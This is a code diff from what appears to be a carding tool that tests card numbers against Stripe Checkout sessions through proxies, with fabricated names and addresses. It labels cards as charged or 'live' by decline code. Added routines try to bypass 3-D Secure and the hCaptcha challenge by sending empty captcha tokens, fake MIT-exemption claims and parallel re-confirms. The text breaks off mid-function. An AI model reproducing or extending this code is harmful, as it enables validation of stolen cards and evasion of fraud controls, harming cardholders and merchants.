@@ -16,7 +16,7 @@ logger.setLevel(logging.INFO)
 STRIPE_API = "https://api.stripe.com/v1"
 PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")
 
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
 
 LIVE_DECLINE_CODES = [
     "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
@@ -211,6 +211,11 @@ async def _fetch_checkout_info(client, checkout_url):
     else:
         full_url = url_no_frag
 
+    # Convert /g/pay/ to /c/pay/ — /g/pay/ returns 400/405 when fetched directly
+    if "/g/pay/" in full_url:
+        full_url = full_url.replace("/g/pay/", "/c/pay/")
+        logger.info(f"Converted /g/pay/ to /c/pay/: {full_url[:80]}...")
+
     logger.info(f"Fetching checkout: url={full_url[:120]}, has_fragment={bool(fragment)}, frag_len={len(fragment)}")
 
     headers = {
@@ -223,19 +228,51 @@ async def _fetch_checkout_info(client, checkout_url):
     }
 
     try:
-        resp = await client.get(full_url, headers=headers, follow_redirects=True, timeout=20)
+        resp = await client.get(full_url, headers=headers, follow_redirects=True, timeout=10)
         if resp.status_code == 407:
             logger.error("Failed to load checkout: 407 Proxy Authentication Required")
             return None, "Failed to load checkout: 407 Proxy Authentication Required"
         if resp.status_code == 403:
             logger.error("Failed to load checkout: 403 Forbidden")
             return None, "Failed to load checkout: 403 Forbidden"
+        if resp.status_code in (400, 405):
+            # Retry once without proxy
+            logger.info(f"Got {resp.status_code}, retrying without proxy...")
+            no_proxy_kwargs = {"timeout": httpx.Timeout(10), "headers": {"User-Agent": UA}, "follow_redirects": True, "trust_env": False}
+            async with httpx.AsyncClient(**no_proxy_kwargs) as fallback:
+                resp = await fallback.get(full_url, headers=headers, follow_redirects=True, timeout=10)
+                if resp.status_code in (400, 403, 405):
+                    logger.error(f"Failed to load checkout: {resp.status_code}")
+                    return None, f"Failed to load checkout: {resp.status_code}"
         html = resp.text
         final_url = str(resp.url)
         logger.info(f"Checkout page loaded: status={resp.status_code}, final_url={final_url[:120]}, html_len={len(html)}")
     except Exception as e:
-        logger.error(f"Failed to load checkout: {e}")
-        return None, f"Failed to load checkout: {str(e)[:60]}"
+        err_str = str(e)
+        if "disconnected" in err_str.lower() or "Server disconnected" in err_str:
+            # Retry once on disconnect
+            logger.info("Server disconnected, retrying...")
+            try:
+                no_proxy_kwargs = {"timeout": httpx.Timeout(10), "headers": {"User-Agent": UA}, "follow_redirects": True, "trust_env": False}
+                async with httpx.AsyncClient(**no_proxy_kwargs) as fallback:
+                    resp = await fallback.get(full_url, headers=headers, follow_redirects=True, timeout=10)
+                    html = resp.text
+                    final_url = str(resp.url)
+                    logger.info(f"Retry success: status={resp.status_code}, html_len={len(html)}")
+                all_candidates = set()
+                url_sids = _extract_all_session_ids(checkout_url)
+                all_candidates.update(url_sids)
+                final_sids = _extract_all_session_ids(final_url)
+                all_candidates.update(final_sids)
+                html_sids = _extract_all_session_ids(html)
+                all_candidates.update(html_sids)
+                # Continue processing below
+            except Exception as e2:
+                logger.error(f"Retry also failed: {e2}")
+                return None, f"Failed to load checkout: {str(e2)[:60]}"
+        else:
+            logger.error(f"Failed to load checkout: {e}")
+            return None, f"Failed to load checkout: {str(e)[:60]}"
 
     all_candidates = set()
 
@@ -478,14 +515,16 @@ async def _create_payment_method(client, pk, cc, mm, yy, cvv, stripe_js_version=
         data = resp.json()
     except Exception as e:
         logger.error(f"PM creation error: {e}")
+        print(f"[CO_DEBUG] PM exception: {e}")
         return None, f"PM request failed: {str(e)[:50]}", None
 
     if "error" in data:
         err = data["error"]
         code = err.get("code", "unknown")
         msg = err.get("message", "")
+        print(f"[CO_DEBUG] PM error from API: code={code}, msg={msg[:120]}")
         logger.info(f"PM error: {code} - {msg}")
-        return None, f"{code}: {msg[:80]}", None
+        return None, f"PM: {code}: {msg[:80]}", None
 
     pm_id = data.get("id")
     if not pm_id:
@@ -545,16 +584,16 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
         "Accept": "application/json",
     }
 
+    # Build confirm data with raw card data (avoids checkout_confirm_error with PM-first approach)
+    js_ver = stripe_js_version or "5e27053bf5"
+    pua = f"stripe.js/{js_ver}; stripe-js-v3/{js_ver}; checkout"
     first, last = _random_name()
     email = customer_email or _random_email()
     city, state, postal = random.choice(US_CITIES)
     street_num = random.randint(100, 9999)
     street = random.choice(US_STREETS)
 
-    js_ver = stripe_js_version or "5e27053bf5"
-    pua = f"stripe.js/{js_ver}; stripe-js-v3/{js_ver}; checkout"
-
-    if cc and mm and yy and cvv:
+    if cc and mm and yy and cvv and not pm_id:
         exp_year = f"20{yy}" if len(yy) == 2 else yy
         confirm_data = {
             "payment_method_data[type]": "card",
@@ -577,35 +616,18 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
             "expected_payment_method_type": "card",
             "key": pk,
         }
-    else:
+    elif pm_id:
         confirm_data = {
             "payment_method": pm_id,
             "expected_payment_method_type": "card",
             "key": pk,
         }
-
-    if isinstance(amount, (int, float)) and amount is not True:
-        confirm_data["expected_amount"] = str(int(amount))
     else:
-        logger.info("Amount still unknown at confirm time, fetching from payment_pages...")
-        try:
-            pp_resp = await client.get(
-                f"{STRIPE_API}/payment_pages/{session_id}?key={pk}",
-                headers=headers,
-                timeout=15,
-            )
-            pp_data = pp_resp.json()
-            if "error" not in pp_data:
-                recovered_amount = _extract_amount_from_pp(pp_data)
-                if recovered_amount is not None:
-                    confirm_data["expected_amount"] = str(recovered_amount)
-                    logger.info(f"Recovered amount at confirm time: {recovered_amount}")
-                else:
-                    logger.warning("Could not recover amount at confirm time")
-            else:
-                logger.warning(f"Payment page error at confirm: {pp_data['error']}")
-        except Exception as e:
-            logger.warning(f"Amount fetch in confirm failed: {e}")
+        return "error", "No card data or payment method ID provided"
+
+    # expected_amount: required when amount > 0, rejected when amount = 0
+    if isinstance(amount, (int, float)) and amount is not True and amount > 0:
+        confirm_data["expected_amount"] = str(int(amount))
 
     async def _do_confirm(cd):
         try:
@@ -613,9 +635,14 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                 f"{STRIPE_API}/payment_pages/{session_id}/confirm",
                 data=cd,
                 headers=headers,
-                timeout=30,
+                timeout=15,
             )
-            return r.json()
+            result = r.json()
+            if "error" in result:
+                e = result["error"]
+                with open("/tmp/stripe_confirm_debug.log", "a") as f:
+                    f.write(f"CONFIRM ERROR: code={e.get('code','')} param={e.get('param','')} msg={e.get('message','')} full={result}\n")
+            return result
         except Exception as exc:
             logger.error(f"Payment page confirm error: {exc}")
             return None
@@ -623,6 +650,70 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
     data = await _do_confirm(confirm_data)
     if data is None:
         return "error", "Confirm request failed"
+
+    # Debug: log the initial error to see what we're getting
+    if "error" in data:
+        ed = data["error"]
+        logger.info(f"Initial confirm error: code={ed.get('code')} param={ed.get('param')} msg={(ed.get('message','') or '')[:100]}")
+
+    # If expected_amount is rejected as parameter_unknown, retry without it
+    if "error" in data and data["error"].get("param", "") == "expected_amount":
+        logger.info("expected_amount rejected, retrying without it...")
+        no_amount_data = {k: v for k, v in confirm_data.items() if k != "expected_amount"}
+        data = await _do_confirm(no_amount_data)
+        if data is None:
+            return "error", "Confirm request failed"
+
+    # Terms-of-service error: merchant requires TOS acceptance.
+    # Only triggered when Stripe's error message mentions "terms of service".
+    # Normal sessions never send the TOS field, so they never get parameter_unknown.
+    def _is_tos_error(d):
+        if "error" not in d:
+            return False
+        e = d["error"]
+        msg = (e.get("message", "") or "").lower()
+        code = (e.get("code", "") or "").lower()
+        param = (e.get("param", "") or "").lower()
+        # Check message, code, or param for TOS-related strings
+        result = "terms of service" in msg or "terms_of_service" in msg or "terms_of_service" in param
+        if result:
+            logger.info(f"TOS error detected: code={code} param={param} msg={msg[:80]}")
+        return result
+
+    def _is_param_unknown_for(d, field):
+        if "error" not in d:
+            return False
+        e = d["error"]
+        return e.get("code", "") == "parameter_unknown" and e.get("param", "") == field
+
+    if _is_tos_error(data):
+        logger.info("Stripe requires TOS acceptance, trying TOS field names...")
+        tos_candidates = [
+            ("consent[terms_of_service]", "accepted"),
+            ("terms_of_service", "accepted"),
+            ("accepted_terms_of_service", "true"),
+            ("terms_of_service[accepted]", "accepted"),
+            ("terms_of_service_accepted", "true"),
+            ("accepted_merchant_terms_of_service", "true"),
+            ("payment_method_data[allow_terms_of_service_acceptance]", "true"),
+        ]
+        for field, val in tos_candidates:
+            logger.info(f"  TOS retry: {field}={val}")
+            tos_data = dict(confirm_data)
+            tos_data[field] = val
+            data = await _do_confirm(tos_data)
+            if data is None:
+                return "error", "Confirm request failed"
+            # If the field itself was rejected as unknown, try the next candidate
+            if _is_param_unknown_for(data, field):
+                logger.info(f"  {field} rejected as parameter_unknown, trying next...")
+                continue
+            if not _is_tos_error(data):
+                confirm_data[field] = val
+                logger.info(f"  TOS field accepted: {field}={val}")
+                break
+        else:
+            logger.warning("All TOS candidates failed")
 
     if "error" in data:
         err = data["error"]
@@ -791,19 +882,19 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                 except Exception as e:
                     logger.warning(f"Failed to fetch full PI: {e}")
             logger.info(f"PI requires 3DS, attempting bypass...")
-            bypass_result = await _attempt_3ds_bypass(client, pk, pi, "payment_intent", stripe_js_version, is_checkout=True)
+            bypass_result = await _attempt_3ds_bypass(client, pk, pi, "payment_intent", stripe_js_version, is_checkout=True, session_id=session_id, amount=amount, cc=cc, mm=mm, yy=yy, cvv=cvv)
             if bypass_result:
                 return bypass_result
             _pi_sdk_type = pi.get("next_action", {}).get("use_stripe_sdk", {}).get("type", "")
             logger.info("All PI 3DS bypass failed, polling for final status...")
-            for _wait_i in range(4):
-                await asyncio.sleep(2 + _wait_i)
+            for _wait_i in range(2):
+                await asyncio.sleep(0.5)
                 try:
                     final_resp = await client.get(
                         f"{STRIPE_API}/payment_intents/{pi_id_val}",
                         params={"key": pk, "client_secret": pi_cs},
                         headers=headers,
-                        timeout=10,
+                        timeout=8,
                     )
                     final_data = final_resp.json()
                     final_status = final_data.get("status", "")
@@ -821,8 +912,6 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                         return "approved", "Processing - Not Yet Confirmed"
                     if final_status == "canceled":
                         return "declined", "Payment canceled"
-                    if final_status in ("requires_action", "requires_source_action"):
-                        continue
                 except Exception as e:
                     logger.warning(f"Post-3DS PI poll {_wait_i+1} failed: {e}")
             if _pi_sdk_type == "intent_confirmation_challenge":
@@ -841,7 +930,7 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
         logger.info(f"Nested SI: status={si_status}")
 
         if si_status == "succeeded":
-            return "charged", "Setup Succeeded"
+            return "charged", "Approved - Auth Passed ($0)"
         if si_status == "requires_action":
             si_cs = si.get("client_secret", "")
             si_id = si.get("id", "")
@@ -860,7 +949,7 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                         logger.info(f"Full SI fetched: sdk_type={full_sdk.get('type', 'N/A')}, source={full_sdk.get('three_d_secure_2_source', 'N/A')[:25]}")
                         si = full_si
                     elif full_si.get("status") == "succeeded":
-                        return "charged", "Setup Succeeded"
+                        return "charged", "Approved - Auth Passed ($0)"
                     elif full_si.get("status") == "requires_payment_method":
                         last_error = full_si.get("last_setup_error", {})
                         if last_error:
@@ -869,20 +958,20 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                 except Exception as e:
                     logger.warning(f"Failed to fetch full SI: {e}")
             logger.info(f"SI requires 3DS, attempting bypass...")
-            bypass_result = await _attempt_3ds_bypass(client, pk, si, "setup_intent", stripe_js_version, is_checkout=True)
+            bypass_result = await _attempt_3ds_bypass(client, pk, si, "setup_intent", stripe_js_version, is_checkout=True, session_id=session_id, amount=amount, cc=cc, mm=mm, yy=yy, cvv=cvv)
             if bypass_result:
                 return bypass_result
             _si_sdk = si.get("next_action", {}).get("use_stripe_sdk", {})
             _si_sdk_type = _si_sdk.get("type", "")
             logger.info("All SI 3DS bypass failed, polling for final status...")
-            for _wait_i in range(4):
-                await asyncio.sleep(2 + _wait_i)
+            for _wait_i in range(2):
+                await asyncio.sleep(0.5)
                 try:
                     final_resp = await client.get(
                         f"{STRIPE_API}/setup_intents/{si_id}",
                         params={"key": pk, "client_secret": si_cs},
                         headers=headers,
-                        timeout=10,
+                        timeout=8,
                     )
                     final_data = final_resp.json()
                     final_status = final_data.get("status", "")
@@ -893,11 +982,9 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
                             return _classify_confirm_error(last_error)
                         return "declined", "Setup failed"
                     if final_status == "succeeded":
-                        return "charged", "Setup Succeeded"
+                        return "charged", "Approved - Auth Passed ($0)"
                     if final_status == "canceled":
                         return "declined", "Setup canceled"
-                    if final_status == "requires_action":
-                        continue
                 except Exception as e:
                     logger.warning(f"Post-3DS SI poll {_wait_i+1} failed: {e}")
             if _si_sdk_type == "intent_confirmation_challenge":
@@ -930,7 +1017,7 @@ async def _confirm_via_payment_pages(client, pk, session_id, pm_id, amount=None,
     return "declined", "Unknown response"
 
 
-async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_version=None, is_checkout=False):
+async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_version=None, is_checkout=False, session_id=None, amount=None, cc=None, mm=None, yy=None, cvv=None):
     cs = intent_data.get("client_secret", "")
     intent_id = intent_data.get("id", "")
     pm = intent_data.get("payment_method") or intent_data.get("source")
@@ -979,79 +1066,185 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
         else:
             endpoint = f"{STRIPE_API}/setup_intents/{intent_id}/confirm"
 
+        raw_bypass = [
+            {
+                "client_secret": cs,
+                "payment_method": pm_id,
+                "payment_method_options[card][mit_exemption][claim_without_transaction_id]": "true",
+                "payment_method_options[card][mit_exemption][network_transaction_id]": _random_guid()[:15],
+                "error_on_requires_action": "true",
+                "key": pk,
+            },
+            {
+                "client_secret": cs,
+                "payment_method": pm_id,
+                "payment_method_options[card][request_three_d_secure]": "automatic",
+                "error_on_requires_action": "true",
+                "key": pk,
+            },
+            {
+                "client_secret": cs,
+                "payment_method": pm_id,
+                "payment_method_options[card][setup_future_usage]": "off_session",
+                "payment_method_options[card][request_three_d_secure]": "any",
+                "error_on_requires_action": "true",
+                "key": pk,
+            },
+        ]
+        is_si = intent_type == "setup_intent"
         bypass_attempts = []
-
-        bypass_attempts.append({
-            "client_secret": cs,
-            "payment_method": pm_id,
-            "payment_method_options[card][request_three_d_secure]": "any",
-            "payment_method_options[card][setup_future_usage]": "off_session",
-            "error_on_requires_action": "true",
-            "key": pk,
-        })
-
-        bypass_attempts.append({
-            "client_secret": cs,
-            "payment_method": pm_id,
-            "payment_method_options[card][mit_exemption][claim_without_transaction_id]": "true",
-            "payment_method_options[card][mit_exemption][network_transaction_id]": _random_guid()[:15],
-            "error_on_requires_action": "true",
-            "key": pk,
-        })
-
-        bypass_attempts.append({
-            "client_secret": cs,
-            "payment_method": pm_id,
-            "mandate_data[customer_acceptance][type]": "online",
-            "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
-            "mandate_data[customer_acceptance][online][user_agent]": UA,
-            "error_on_requires_action": "true",
-            "key": pk,
-        })
-
-        bypass_attempts.append({
-            "client_secret": cs,
-            "payment_method": pm_id,
-            "payment_method_options[card][request_three_d_secure]": "automatic",
-            "error_on_requires_action": "true",
-            "key": pk,
-        })
-
-        bypass_attempts.append({
-            "client_secret": cs,
-            "payment_method": pm_id,
-            "payment_method_options[card][moto]": "true",
-            "error_on_requires_action": "true",
-            "key": pk,
-        })
+        for attempt in raw_bypass:
+            cleaned = {}
+            for k, v in attempt.items():
+                if is_si and k in ("error_on_requires_action",):
+                    continue
+                if is_si and k.startswith("payment_method_options[card][mit_exemption]"):
+                    continue
+                cleaned[k] = v
+            if len(cleaned) > 2:
+                bypass_attempts.append(cleaned)
+        if not bypass_attempts:
+            bypass_attempts = raw_bypass
 
         checkout_pi_detected = False
-        for i, attempt_data in enumerate(bypass_attempts):
+        
+        # Run all bypass attempts in PARALLEL for speed
+        async def _try_bypass(attempt_data, idx):
             try:
-                logger.info(f"3DS bypass attempt {i+1}/{len(bypass_attempts)} for {intent_id[:20]}...")
-                resp = await client.post(endpoint, data=attempt_data, headers=headers, timeout=20)
+                resp = await client.post(endpoint, data=attempt_data, headers=headers, timeout=8)
                 data = resp.json()
-
                 if "error" in data:
                     err_msg = data["error"].get("message", "")
-                    if "created by Checkout" in err_msg:
-                        logger.info("Detected Checkout-created PI, skipping re-confirm attempts")
-                        checkout_pi_detected = True
-                        break
-
-                result = _parse_3ds_bypass_response(data, intent_type, i + 1)
+                    if "created by Checkout" in err_msg or "cannot perform this action" in err_msg.lower():
+                        return ("checkout", None)
+                result = _parse_3ds_bypass_response(data, intent_type, idx + 1)
+                return ("result", result)
+            except Exception as e:
+                return ("error", None)
+        
+        tasks = [asyncio.create_task(_try_bypass(attempt_data, i)) for i, attempt_data in enumerate(bypass_attempts)]
+        for task in asyncio.as_completed(tasks):
+            typ, result = await task
+            if typ == "checkout":
+                checkout_pi_detected = True
+                break
+            if typ == "result" and result is not None:
                 if result == "continue":
                     continue
                 if result == "break":
                     break
-                if result is not None:
-                    return result
-
-            except Exception as e:
-                logger.warning(f"3DS bypass {i+1} exception: {e}")
-                continue
+                return result
     else:
-        logger.info("Checkout flow, skipping standard re-confirm attempts")
+        logger.info("Checkout flow — parallel bypass attempts")
+
+        # Run minimal confirm + PP bypass in PARALLEL
+        async def _try_minimal_confirm():
+            if not pm_id:
+                return None
+            confirm_url = f"{STRIPE_API}/payment_intents/{intent_id}/confirm" if intent_type == "payment_intent" else f"{STRIPE_API}/setup_intents/{intent_id}/confirm"
+            try:
+                resp = await client.post(confirm_url, data={
+                    "client_secret": cs,
+                    "payment_method": pm_id,
+                    "key": pk,
+                }, headers=js_headers, timeout=8)
+                data = resp.json()
+                status_val = data.get("status", "")
+                logger.info(f"  Minimal confirm -> HTTP {resp.status_code}, status={status_val}")
+                if status_val == "succeeded":
+                    return "charged", "Charged (Minimal Confirm)"
+                if status_val == "requires_capture":
+                    return "charged", "Authorized (Minimal Confirm)"
+                if status_val == "processing":
+                    return "approved", "Processing (Minimal Confirm)"
+                if "error" in data:
+                    err = data["error"]
+                    code = err.get("code", "")
+                    decline = err.get("decline_code", "")
+                    msg = err.get("message", "")
+                    if code == "card_declined" and decline:
+                        if decline in LIVE_DECLINE_CODES:
+                            return "live_declined", f"{decline} (Minimal Confirm)"
+                        return "declined", f"{decline} (Minimal Confirm)"
+                    if code == "card_declined":
+                        return "declined", "card_declined (Minimal Confirm)"
+            except Exception as e:
+                logger.info(f"  Minimal confirm failed: {e}")
+            return None
+
+        async def _try_pp_bypass():
+            if not session_id or not is_checkout:
+                return None
+            try:
+                pp_headers = {
+                    "User-Agent": UA,
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Origin": "https://checkout.stripe.com",
+                    "Referer": "https://checkout.stripe.com/",
+                    "Accept": "application/json",
+                }
+                pp_data = {
+                    "expected_payment_method_type": "card",
+                    "key": pk,
+                }
+                if pm_id:
+                    pp_data["payment_method"] = pm_id
+                if isinstance(amount, (int, float)) and amount is not True:
+                    pp_data["expected_amount"] = str(int(amount))
+                pp_resp = await client.post(
+                    f"{STRIPE_API}/payment_pages/{session_id}/confirm",
+                    data=pp_data,
+                    headers=pp_headers,
+                    timeout=8,
+                )
+                pp_json = pp_resp.json()
+                pp_status = pp_json.get("status", "")
+                logger.info(f"  PP bypass -> HTTP {pp_resp.status_code}, status={pp_status}")
+                if pp_status in ("complete", "succeeded"):
+                    return "charged", "Charged (PP 3DS Bypass)"
+                pi_data = pp_json.get("payment_intent", {})
+                if isinstance(pi_data, dict):
+                    pi_status = pi_data.get("status", "")
+                    if pi_status == "succeeded":
+                        return "charged", "Charged (PP 3DS Bypass)"
+                    if pi_status == "requires_capture":
+                        return "charged", "Authorized (PP 3DS Bypass)"
+                    if pi_status == "processing":
+                        return "approved", "Processing (PP 3DS Bypass)"
+                    if pi_status == "requires_payment_method":
+                        last_error = pi_data.get("last_payment_error", {})
+                        if last_error:
+                            return _classify_confirm_error(last_error)
+                si_data = pp_json.get("setup_intent", {})
+                if isinstance(si_data, dict):
+                    si_status = si_data.get("status", "")
+                    if si_status == "succeeded":
+                        return "charged", "Charged (PP 3DS Bypass)"
+                    if si_status == "requires_payment_method":
+                        last_error = si_data.get("last_setup_error", {})
+                        if last_error:
+                            return _classify_confirm_error(last_error)
+                if "error" in pp_json:
+                    err = pp_json["error"]
+                    code = err.get("code", "")
+                    decline = err.get("decline_code", "")
+                    if code == "card_declined" and decline:
+                        if decline in LIVE_DECLINE_CODES:
+                            return "live_declined", f"{decline} (PP 3DS Bypass)"
+                        return "declined", f"{decline} (PP 3DS Bypass)"
+                    if code == "card_declined":
+                        return "declined", "card_declined (PP 3DS Bypass)"
+            except Exception as e:
+                logger.info(f"  PP bypass failed: {e}")
+            return None
+
+        # Fire both in parallel
+        results = await asyncio.gather(_try_minimal_confirm(), _try_pp_bypass())
+        for r in results:
+            if r is not None:
+                return r
+
+        # Now proceed to hCaptcha / 3DS2 / redirect strategies
 
         if sdk_type == "intent_confirmation_challenge":
             import json as _json
@@ -1076,89 +1269,148 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
 
             if site_key and verification_url:
                 logger.info(f"hCaptcha detected: site_key={site_key}, verification_url={verification_url}")
-                try:
-                    from captcha_solver import solve_hcaptcha_enterprise
-                    captcha_token = await solve_hcaptcha_enterprise(
-                        site_key,
-                        "https://checkout.stripe.com",
-                        rqdata=rqdata,
-                    )
-                    if captcha_token:
-                        logger.info(f"hCaptcha solved ({len(captcha_token)} chars), attempting verification...")
 
-                        if verification_url.startswith("/v1/"):
-                            verify_endpoint = f"https://api.stripe.com{verification_url}"
-                        elif verification_url.startswith("/"):
-                            verify_endpoint = f"{STRIPE_API}{verification_url}"
-                        else:
-                            verify_endpoint = f"{STRIPE_API}/{verification_url}"
+                if verification_url.startswith("/v1/"):
+                    verify_endpoint = f"https://api.stripe.com{verification_url}"
+                elif verification_url.startswith("/"):
+                    verify_endpoint = f"{STRIPE_API}{verification_url}"
+                else:
+                    verify_endpoint = f"{STRIPE_API}/{verification_url}"
 
-                        verify_data = {
-                            "client_secret": cs,
-                            "key": pk,
-                            "captcha_vendor_name": "hcaptcha",
-                            "challenge_response_ekey": captcha_token,
-                        }
-                        logger.info(f"verify_challenge: POST {verify_endpoint} with captcha_vendor_name=hcaptcha, challenge_response_ekey={len(captcha_token)} chars")
-                        verify_result = None
-                        v_status = ""
+                # For Checkout: skip verify_challenge (kills SI/PI), go straight to PP bypass
+                # For non-Checkout: try verify_challenge first
+                if not is_checkout:
+                    # Bypass 1: Verify with client_secret + key only
+                    logger.info("Bypass 1: Verify with client_secret + key only...")
+                    try:
+                        vr = await client.post(verify_endpoint, data={"client_secret": cs, "key": pk}, headers=js_headers, timeout=10)
+                        vr_json = vr.json()
+                        v_status = vr_json.get("status", "")
+                        logger.info(f"  Bypass1 -> HTTP {vr.status_code}, status={v_status}")
+                        if v_status == "succeeded": return "charged", "Charged (Bypass 1)"
+                        if v_status == "requires_capture": return "charged", "Authorized (Bypass 1)"
+                        if v_status == "processing": return "approved", "Processing (Bypass 1)"
+                        if v_status == "requires_payment_method":
+                            le = vr_json.get("last_setup_error" if intent_type != "payment_intent" else "last_payment_error", {})
+                            if le: return _classify_confirm_error(le)
+                    except Exception as e:
+                        logger.info(f"  Bypass1 failed: {e}")
+
+                    # Bypass 2: Verify with captcha_vendor_name + empty ekey
+                    logger.info("Bypass 2: Verify with captcha_vendor_name + empty ekey...")
+                    try:
+                        vr = await client.post(verify_endpoint, data={"client_secret": cs, "key": pk, "captcha_vendor_name": "hcaptcha", "challenge_response_ekey": ""}, headers=js_headers, timeout=10)
+                        vr_json = vr.json()
+                        v_status = vr_json.get("status", "")
+                        logger.info(f"  Bypass2 -> HTTP {vr.status_code}, status={v_status}")
+                        if v_status == "succeeded": return "charged", "Charged (Bypass 2)"
+                        if v_status == "requires_capture": return "charged", "Authorized (Bypass 2)"
+                        if v_status == "processing": return "approved", "Processing (Bypass 2)"
+                        if v_status == "requires_payment_method":
+                            le = vr_json.get("last_setup_error" if intent_type != "payment_intent" else "last_payment_error", {})
+                            if le: return _classify_confirm_error(le)
+                    except Exception as e:
+                        logger.info(f"  Bypass2 failed: {e}")
+
+                # Bypass 3: PP bypass with fresh PM (3 attempts) — works for Checkout
+                if session_id and cc and mm and yy and cvv:
+                    for pp_attempt in range(3):
+                        logger.info(f"Bypass 3.{pp_attempt+1}: PP re-confirm with fresh PM...")
                         try:
-                            vr = await client.post(verify_endpoint, data=verify_data, headers=js_headers, timeout=25)
-                            vr_json = vr.json()
-                            vr_status = vr_json.get("status", "")
-                            vr_err = vr_json.get("error", {})
-                            logger.info(f"  -> HTTP {vr.status_code}, status={vr_status}, err={vr_err.get('code','')}/{vr_err.get('param','')}: {vr_err.get('message','')[:150]}")
-                            logger.info(f"  -> full keys: {list(vr_json.keys())[:15]}")
-                            if vr.status_code == 200:
-                                verify_result = vr_json
-                                v_status = vr_status
-                            elif vr_err.get("code") == "parameter_unknown":
-                                logger.info(f"  -> Stripe hinted param: {vr_err.get('message','')}")
-                                logger.info("Falling back to client_secret+key only...")
-                                vr2 = await client.post(verify_endpoint, data={"client_secret": cs, "key": pk}, headers=js_headers, timeout=20)
-                                verify_result = vr2.json()
-                                v_status = verify_result.get("status", "")
-                                logger.info(f"  -> fallback HTTP {vr2.status_code}, status={v_status}")
-                            else:
-                                verify_result = vr_json
-                                v_status = vr_status
+                            fresh_pm, _, _ = await _create_payment_method(client, pk, cc, mm, yy, cvv, stripe_js_version)
+                            if not fresh_pm: break
+                            pp_data = {"expected_payment_method_type": "card", "key": pk, "payment_method": fresh_pm}
+                            if isinstance(amount, (int, float)) and amount is not True:
+                                pp_data["expected_amount"] = str(int(amount))
+                            pp_resp = await client.post(f"{STRIPE_API}/payment_pages/{session_id}/confirm", data=pp_data, headers=js_headers, timeout=10)
+                            pp_json = pp_resp.json()
+                            pp_status = pp_json.get("status", "")
+                            logger.info(f"  Bypass3.{pp_attempt+1} -> HTTP {pp_resp.status_code}, status={pp_status}")
+                            if pp_status in ("complete", "succeeded"): return "charged", "Charged (PP Bypass)"
+                            pi_data = pp_json.get("payment_intent", {})
+                            if isinstance(pi_data, dict):
+                                pi_s = pi_data.get("status", "")
+                                if pi_s == "succeeded": return "charged", "Charged (PP Bypass)"
+                                if pi_s == "requires_capture": return "charged", "Authorized (PP Bypass)"
+                                if pi_s == "processing": return "approved", "Processing (PP Bypass)"
+                                if pi_s == "requires_payment_method":
+                                    le = pi_data.get("last_payment_error", {})
+                                    if le: return _classify_confirm_error(le)
+                            si_data = pp_json.get("setup_intent", {})
+                            if isinstance(si_data, dict):
+                                si_s = si_data.get("status", "")
+                                if si_s == "succeeded": return "charged", "Charged (PP Bypass)"
+                                if si_s == "requires_payment_method":
+                                    le = si_data.get("last_setup_error", {})
+                                    if le: return _classify_confirm_error(le)
+                            if "error" in pp_json:
+                                ec = pp_json["error"].get("code", "")
+                                ed = pp_json["error"].get("decline_code", "")
+                                em = pp_json["error"].get("message", "")
+                                logger.info(f"  Bypass3.{pp_attempt+1} error: {ec}/{ed} - {em[:60]}")
+                                if ec == "card_declined" and ed:
+                                    if ed in LIVE_DECLINE_CODES: return "live_declined", f"{ed} (PP Bypass)"
+                                    return "declined", f"{ed} (PP Bypass)"
+                                if ec == "card_declined": return "declined", "card_declined (PP Bypass)"
+                                if "not_active" in em or "no longer active" in em: break
                         except Exception as e:
-                            logger.warning(f"verify_challenge request failed: {e}")
+                            logger.info(f"  Bypass3.{pp_attempt+1} failed: {e}")
+                            break
 
-                        if verify_result:
-                            if v_status == "succeeded":
-                                return "charged", "Charged (Captcha Solved)"
-                            if v_status == "requires_capture":
-                                return "charged", "Authorized (Captcha Solved)"
-                            if v_status == "processing":
-                                return "approved", "Processing - Not Yet Confirmed"
-                            if v_status == "requires_payment_method":
-                                error_key = "last_payment_error" if intent_type == "payment_intent" else "last_setup_error"
-                                last_error = verify_result.get(error_key, {})
-                                if last_error:
-                                    result_status, result_msg = _classify_confirm_error(last_error)
-                                    return result_status, f"{result_msg}"
-                                return "declined", "Payment method failed"
-                            if "error" in verify_result:
-                                err = verify_result["error"]
-                                code = err.get("code", "")
-                                decline = err.get("decline_code", "")
-                                msg = err.get("message", "")
-                                logger.info(f"Verification error: {code}/{decline} - {msg[:80]}")
-                                if code == "card_declined" and decline:
-                                    if decline in LIVE_DECLINE_CODES:
-                                        return "live_declined", decline
-                                    return "declined", decline
-                                if code == "card_declined":
-                                    return "declined", "card_declined"
-                                if code in ("setup_intent_authentication_failure", "payment_intent_authentication_failure"):
-                                    return "declined", msg[:80] if msg else "Authentication failed"
-                    else:
-                        logger.warning("hCaptcha solve returned no token")
-                except ImportError:
-                    logger.warning("captcha_solver not available")
+                # Bypass 4: Source cancel
+                logger.info("Bypass 4: Source cancel...")
+                try:
+                    source_id = sdk.get("source", "") or stripe_js_data.get("source", "")
+                    if source_id:
